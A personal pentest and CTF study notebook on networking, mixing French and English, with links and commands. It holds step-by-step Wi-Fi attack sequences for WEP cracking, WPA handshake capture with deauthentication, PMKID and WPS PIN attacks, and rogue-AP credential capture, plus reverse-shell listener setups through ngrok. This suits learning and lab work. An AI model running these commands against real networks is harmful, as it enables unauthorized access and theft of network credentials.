## Documentation

- https://servethehome.com/
- https://ctf-wiki.mahaloz.re/misc/traffic/introduction/
- https://github.com/frostbits-security/MITM-cheatsheet/
- https://github.com/sergiomarotco/Network-segmentation-cheat-sheet
- https://heystacks.com/doc/401/attacking-secondary-contexts-in-web-applications
- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-wifi/index.html
- http://web.archive.org/web/20220612232400/https://www.orangecyberdefense.com/fr/insights/blog/ethical-hacking/etat-de-lart-du-pivoting-reseau-en-2019
- https://cyber.gouv.fr/publications/recommandations-relatives-aux-architectures-des-services-dns
- https://cyber.gouv.fr/publications/recommandations-relatives-linterconnexion-dun-si-internet

### Cours

- https://zestedesavoir.com/tutoriels/2789/les-reseaux-de-zero/
- https://maxnilz.com/docs/004-network/005-linux-rx-v0/
- https://beej.us/guide/bgnet0/html/split/

## Captures / Challenges

- https://wifichallengelab.com/
- https://wiki.wireshark.org/SampleCaptures
- https://tshark.dev/analyze/packet_hunting/packet_hunting/ (memo)
- https://packetlife.net/blog/2009/jul/13/quick-packet-capture-data-extraction/
- https://stackoverflow.com/questions/10300656/capture-incoming-traffic-in-tcpdump


```bash
# basic traffic capture
sudo tcpdump -l -n -i wlan0

# basic pcap parsing
# filtering protocols -Y "ip.addr == 127.0.0.1 && icmp.type==8"
tshark -2 -r chall.pcap -T fields -e data
```

## Outils

- [Alfa antennas - dongle USB](https://www.alfa.com.tw/)
- [Bettercap](https://www.bettercap.org/installation/)
- [Eaphammer](https://github.com/s0lst1c3/eaphammer)
- [GQRX](https://github.com/gqrx-sdr/gqrx), [GNURadio](https://wiki.gnuradio.org/index.php/Main_Page)
- [Hex Packet Decoder](https://www.gasmi.net/hpd/)
- [Hping3](https://thelinuxcode.com/hping3/)
- [Ngrok](https://ngrok.com/), [Serveo](https://serveo.net), [Collaborative - cat.flag.sh](https://cat.flag.sh), [Tunnel (Wiregard)](https://tunnel.pyjam.as/)
- [Revshells](https://revshells.com)
- [Tshark](https://tshark.dev/)
- [Wifite2](https://github.com/kimocoder/wifite2)

### Nat

- https://zestedesavoir.com/tutoriels/2789/les-reseaux-de-zero/reprenons-du-service/nat/

### Règles / Firewall

- https://zestedesavoir.com/tutoriels/2789/les-reseaux-de-zero/apprenons-a-securiser-un-reseau/allumez-le-pare-feu/
- https://docs.suricata.io/en/suricata-6.0.0/rules/intro.html

### Subnetting

`Memo: masque=subnet+host`

- https://youtu.be/B1vqKQIPxr0
- https://www.calculator.net/ip-subnet-calculator.html
- https://zestedesavoir.com/tutoriels/2789/les-reseaux-de-zero/veuillez-vous-identifier-pour-communiquer/le-subnetting-en-pratique/

```
10.1.1.0/24 ->3  subnets, 40 hosts 1st one 
- `/24`-> 24 x '1' : 255.255.255.0
- nosferat2: 40 <=64 = 2  ^ 6:  -> increment = (nosferatu (1) 1 (0 0 0 0 0 0) -> 64)) 
- m = ssssss hh : 255.255.255.192 (nosfera2 : 1+1 -> 128+64)= /26 (CIDR notation)
- 10.1.1.0-> 10.1.1.63 (inc=64) -> 2^6 - 2 machines
```

```
1st: 10.1.1.0/26
2nd: 10.1.1.64/26
3d: 10.1.1.128/26
```

### Iptables / http.server

`voir ../ctf`

## Curl

`curl  is a tool for transferring data from or to a server. It supports these protocols: DICT, FILE, FTP, FTPS,
GOPHER, GOPHERS, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, MQTT, POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP,  SMB,
SMBS, SMTP, SMTPS, TELNET or TFTP. The command is designed to work without user interaction.`

- https://devhints.io/curl

### ARP

```bash
arp-scan wlan0
```

### DNS

#### Free DNS

- https://www.noip.com/

#### Zone transfer

Get AXFR records without auth:

- get subdomains from domain_name
- all records for a subdomain

```bash
dig axfr @IP (sub)_domain_name
#@server/routeur subdomain

host -t axfr zonetransfer.me nsztm1.digi.ninja.
```

#### DNSCrypt & DNSSEC

- https://github.com/DNSCrypt/dnscrypt-proxy/wiki/Installation-linux
- https://security.stackexchange.com/questions/122547/is-there-a-point-to-dnscrypt-when-using-vpn
- https://github.com/DNSCrypt/dnscrypt-proxy/issues/519

**1.1.1.1**

- https://security.stackexchange.com/questions/238871/will-1-1-1-1-hide-my-traffic-from-my-landlords-router
- https://www.reddit.com/r/CloudFlare/comments/15inies/difference_between_1111_and_warp/

ou

```bash
sudo pacman -S dnsproxy
sudo rm -f /etc/resolv.c*
sudo nano /etc/resolv.conf
#nameserver 127.0.0.1
#options edns0

sudo dnscrypt-proxy -service install
sudo dnscrypt-proxy -service start
dnscrypt-proxy -config /etc/dnscrypt-proxy/dnscrypt-proxy.toml -resolve example.com
```

- https://lig-membres.imag.fr/sicard/tpRES/DNSRICM2-TP.pdf
- https://digi.ninja/projects/zonetransferme.php

#### DNS Rebinding

- https://nip.io/ 
- https://github.com/mpgn/ByP-SOP
- https://lock.cmpxchg8b.com/rebinder.html

#### Reverse DNS lookup

- https://web-check.as93.net/
- https://dnsdumpster.com/ (map)
- https://search.censys.io/
- https://www.ssllabs.com/ssltest/
- https://subdomainfinder.c99.nl/
- https://www.duckdns.org/

```bash
whois google.com
```

```bash
nslookup flaws.cloud
nslookup 52.92.249.179
```

### FTP

- https://fr.wikipedia.org/wiki/File_Transfer_Protocol

Serveur:

```bash
mkdir secret; cd secret
python -m pyftpdlib -D
ngrok tcp 2121
```

### HTTP

[Curl Options & POST](https://gist.github.com/subfuzion/08c5d85437d5d4f00e58)

```bash
mkdir secret; cd secret
ngrok tcp 4444

# Requêtes
nc -nlvp 4444

# Ou (serveur)
python -m http.server 4444
```
### LDAP

- https://serverfault.com/questions/1083914/replace-anonymous-ldapsearch-command-with-curl-command

### MAIL

- https://support.mozilla.org/en-US/kb/blocking-sender
- https://elsicarius.fr/les-adresses-email-vous-connaissez

### QUIC

- https://github.com/francoismichel/ssh3

### Radio

### GnuRadio Modulation

`hw:0,0`: name device

```bash
sudo pacman -S qwt
aplay -l
cat /proc/asound/cards
```

- https://recolog.blogspot.com/2017/08/demodulating-am-signals-using-gnuradio.html

#### Slow-Scan Television

- https://www.qsl.net/on4qz/qsstv/manual/index.html

### SIP

![sip](./images/maps-sip-web-architecture.jpg)

- https://www.commentcamarche.net/telecharger/communication/24399-x-lite/

### TCP (MitM)

- https://0x25.github.io/2021/09/09/Patch-TCP-packets-on-the-fly/

## Reverse Proxy - Ip Spoofing

**Ngrok**

### HTTP (public link - to device)

```bash
ngrok http --region eu 12001
python -m http.server 12001
```

### TCP (reverse shell - to host)

```bash
ngrok tcp 4444
pwncat-cs -lp 4444
```

**Nginx**

```bash
sudo apt install nginx
```

```bash
sudo vim etc/nginx/sites-available/default
```

```
server {
   ...
         # remplacer location /
	location / {
                proxy_pass http://vulnerable-site.org ; 
                proxy_set_header X-Forwarded-For $remote_addr ;
	}
   ...
}
```

```bash
sudo systemctl restart nginx
firefox $(ip a s eth0 | awk -F'[/ ]+' '/inet[^6]/{print $3}')/page #http://vulnerable-site.org/page
```

## SNMP

- https://www.0x0ff.info/2013/snmpv3-des-cryptool/

## XMPP

- https://wiki.xmpp.org/web/SASL_Authentication_and_SCRAM

## Wifi

- https://wigle.net/
- https://github.com/derv82/wifite2/
- https://github.com/V0lk3n/WirelessPentesting-CheatSheet
- https://cheatsheet.haax.fr/wireless/wifi_cracking/
- https://www2.aircrack-ng.org/hiexpo/aircrack-ng_book_v1.pdf
- https://www.aircrack-ng.org/doku.php?id=shared_key
- https://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients
- https://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_via_a_wireless_client
- https://null-byte.wonderhowto.com/how-to/buy-best-wireless-network-adapter-for-wi-fi-hacking-2019-0178550/
- https://null-byte.wonderhowto.com/how-to/select-field-tested-kali-linux-compatible-wireless-adapter-0180076/

```bash
sudo wifite -mac --keep-ivs --ignore-locks -ic --pmkid-timeout 600 --v # --kill -inf -p 3600 --bully
```

### Internals

- Implementation (Linux) with `wpa_supplicant -h` or `NetworkManager -h`
- **RSN**: Robust security Networks (**802.11i**), (since TKIP/CCMP for PSK)
- **802.1X**: Port-based Network Access Control: supplicant (station/client), authenticator/controller (Access Point if Wifi) & authentication server (Radius if MGT)
- **802.11 (WIFI)**: Different norms for **channels** : 802.11a/b/g/n/ac/ad/ax
- **BSSID**: Access Point MAC, ESSID: Access Point Name, STATION MAC: MAC of 1 AP's Client, MAC: Personal MAC (`macchanger -s wlan1mon`)
- 2 modes for WPA/WPA2: **PSK** (Personal AP) and **Enterprise/MGT** (Enterprise AP with **Radius** server)
- 2 modes for WPA3: **SAE** and **Enterprise**
- Enterprise mode: Client <-- EAP (TLS,TTLS,PEAP,Kerberos,SIM)--> AP <-- PSK or SAE --> Radius server

### Man In The Middle

- https://security.stackexchange.com/questions/225985/is-there-any-point-of-arp-spoofing-on-a-wifi-network

```bash
sudo ip l set wlanx down
sudo iw wlanx set monitor none
sudo ip l set wlanx up
sudo iw wlanx info
sudo wireshark&
```

### WEP, WPA-PSK (4 way handshake with TKIP => RC4)

- https://dl.aircrack-ng.org/breakingwepandwpa.pdf
- https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
- https://aur.archlinux.org/packages/wpa_supplicant-wep
- WEP vulns: **RC4** Key Schedule, **IV Reuse** (Birthday Paradox ~ 5000 packets), bad integrity control (CRC32), no anti-replay mechanism

```txt
#wep challenge in wireshark
wlan.fc.type_subtype == 0x0020
```

#### Authentification

```txt
encrypted_packet = plaintext ^ RC4(iv|key)

iv = 24 bits
key = iv|psk
psk = 5 chars = 40 bits <-> key = iv|psk = 64 bits
psk = 13 chars = 104 bits <-> key = iv|psk = 128 bits
```

![](./images/simple-wep-crack.gif)

#### Capture & ARP Request Replay

Capture an encrypted packet which is the size of an ARP request, replays it to the AP, which generates new packets with **extra IVs**

```bash
# Using appropriate channel found using airodump-ng for the 1st time
airmon-ng stop wlan1mon
airmon-ng start wlan1 <CHANNEL>
airodump-ng --bssid <BSSID> -w wep wlan1mon

aireplay-ng -3 -b <BSSID> -h <STATION MAC> -x 600 wlan1mon
```

```bash
# WEP
aireplay-ng  --help
#  Attack modes (numbers can still be used):
#
#      --deauth      count : deauthenticate 1 or all stations (-0)
#      --fakeauth    delay : fake authentication with AP (-1)
#      --interactive       : interactive frame selection (-2)
#      --arpreplay         : standard ARP-request replay (-3)
#      --chopchop          : decrypt/chopchop WEP packet (-4)
#      --fragment          : generates valid keystream   (-5)
#      --caffe-latte       : query a client for new IVs  (-6)
#      --cfrag             : fragments against a client  (-7)
#      --migmode           : attacks WPA migration mode  (-8)
#      --test              : tests injection and quality (-9)

# WPA-PSK
tkiptun-ng --help
```

#### Capture & Deauth

```bash
airmon-ng start wlan1 #set monitor & rename wlan0 (wlan0mon)
airodump-ng wlan1mon #scan network
airodump-ng --bssid <BSSID> -w wep wlan1mon # capture from bssid (last command) , -w = prefix name

aireplay -0 1 -a <BSSID> -c <STATION MAC> wlan1mon
```

#### Capture & IP Redirection

**KoreK ChopChop**:
Chop one byte of an encrypted packet, still producing a valid CRC32

```bash
# airodump-ng --bssid <BSSID> -w wep wlan1mon

aireplay-ng -4 -b <BSSID> -h <STATION MAC> wlan1mon
# Outputting 2 files
# replay_dec_.xor replay_dec_.cap
```

**Fragmentation attack**:
Redirecting dest IP to a controlled IP, tricking the AP to decrypt the fragmented packet

```bash
# airodump-ng --bssid <BSSID> -w wep wlan1mon

aireplay-ng -5 -b <BSSID> -h <STATION MAC> <interface>
packetforge-ng -0 -a <BSSID> -h <STATION MAC> -l <Source IP> -k <Dest IP> -y <xor filename> -w <output filename>
aireplay-ng -2 -r <packet filename> wlan1mon
```

#### Client-Less Fake Authentication

```bash
# airodump-ng --bssid <BSSID> -w wep wlan1mon

aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <MAC> wlan1mon

# OR
# -1 6000 : Reauthenticate every 6000s
# -o 1 : Send only one set of packets at a time
# -q 10 : Send keep alive packets every 10 seconds
aireplay-ng -1 6000 -o 1 -q 10 -e <ESSID> -a <BSSID> -h <MAC> wlan1mon
```

Then use the Fragmentation (or ChopChop) attack

```bash
aireplay-ng -5 -b <BSSID> -h <MAC> wlan1mon
#  Use this packet ? y
#  Outputting xor and cap files

# If not successful use KoreK ChopChop attack
aireplay-ng -4 -h <MAC> -b <BSSID> wlan1mon
#  Use this packet ? y
#  Outputting xor and cap files
```

Reuse this to forge a new packet

```bash
packetforge-ng -0 -a <BSSID> -h <MAC> -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w arp-request.cap
```
 
Relaunch airodump and inject the crafted packet

```bash
airodump-ng -c X --bssid <BSSID> -w new_capture wlan1mon
aireplay-ng -2 -r arp-request wlan1mon
#Use this packet ? y
```

Crack the captures

```bash
aircrack-ng -b <BSSID> capture*.cap 
```

#### Tests & Bruteforce

```bash
# w = hex key, testing if len(key) = 13
airdecap-ng -w $(python3 -c "import sys;sys.stdout.buffer.write(b'A'*13)"|xxd -ps) -b  <BSSID> wep-01.cap

# If len fails:
#Invalid WEP key length. [5,13,16,29,61]
#"airdecap-ng --help" for help.
```

```bash
# -a 1 = wep (default)
# -k = korek attack (inspired by FMS), -z = ptw attack (default)

# -n = length key. If len(hex_key)=13 then n = 128
aircrack-ng -w rockyou.txt -b <BSSID> -n 128 wep-01.cap

# set interface back to managed mode
# airodump-ng stop wlan1mon
```

### WPA/WPA2 (4way handshake with CCMP = AES 128 CBC-MAC)

- https://www.aircrack-ng.org/doku.php?id=cracking_wpa
- https://www.wifi-professionals.com/2019/01/4-way-handshake

#### Capture 4-way handshake, Deauth & Bruteforce

**Aircrack**

```bash
#airmon-ng stop wlan1mon
#airmon-ng start wlan1 <CHANNEL>

airodump-ng --bssid <BSSID> -w wpa wlan1mon #find bssid (last command) , -w = prefix name
aireplay -0 1 -a <BSSID> -c <STATION MAC> wlan1mon

# -a 2 = wpa-psk
aircrack-ng -a 2 -w rockyou.txt -b <BSSID> wpa-01.cap
```

**Bettercap**

```bash
sudo docker run -it --privileged --rm --net=host bettercap/bettercap -iface wlanx
#wifi.recon help

wpapcap2john bettercap-wifi-handshakes.pcap
```

#### Tests and Bruteforce

```bash
cowpatty -r hs/handshake_RepeatSalon.cap -f ~/SecLists/Passwords/darkc0de.txt -s RepeatSalon -vv
cowpatty 4.8 - WPA-PSK dictionary attack. <jwright@hasborg.com>

Collected all necessary data to mount crack against WPA2/PSK passphrase.

AA is : ...
SPA is : ...
snonce is: ...
anonce is: ...
keymic is: ...
eapolframe is: ...
```

**Wifite**

```bash
sudo wifite --crack --dict ~/SecLists/Passwords/darkc0de.txt # aircrack, john, hashcat (all bf including PMKID), cowpatty (depreciated)
sudo wifite --crack --dict ~/SecLists/Fuzzing/6-digits-000000-999999.txt 
```

#### Client-Less PMKID attack

- https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/
- Included in **wifite2**

```bash
airmon-ng start wlan1
hcxdumptool -i wlan1mon -o outfile.pcapng --enable_status=1
hcxpcaptool -E essidlist -I identitylist -U usernamelist -z test.16800 test.pcapng
hashcat -m 16800 test.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'
```

#### KRACK

- https://beta.hackndo.com/krack/
- https://www.krackattacks.com/
- https://github.com/vanhoefm/krackattacks-scripts

#### WPS Pin attacks

- Pixie-Dust & Pin bf attack: `reaver`, `bully`
- NULL Pin: `reaver`
- Included in **wifite2**

```bash
sudo wash -i wlan1mon
#BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID

sudo reaver -i wlan0mon -b <BSSID> -vv
```

### WPA2-EAP | WPA-MGT (Entreprise)

- https://www.cisco.com/c/en/us/support/docs/wireless-mobility/wireless-lan-wlan/214275-configure-wireshark-and-freeradius-in-or.html
- https://github.com/koutto/pi-pwnbox-rogueap/wiki/07.-WPA-WPA2-Enterprise-(MGT)

```bash
sudo python3 ./eaphammer –cert-wizard
sudo python3 ./eaphammer -i wlan6 --creds -e "xxx" -b xx:xx:xx:xx:xx:xx #BSSID /MAC
```

### WPA3 (SAE+EAP/MGT)

- https://wpa3.mathyvanhoef.com/
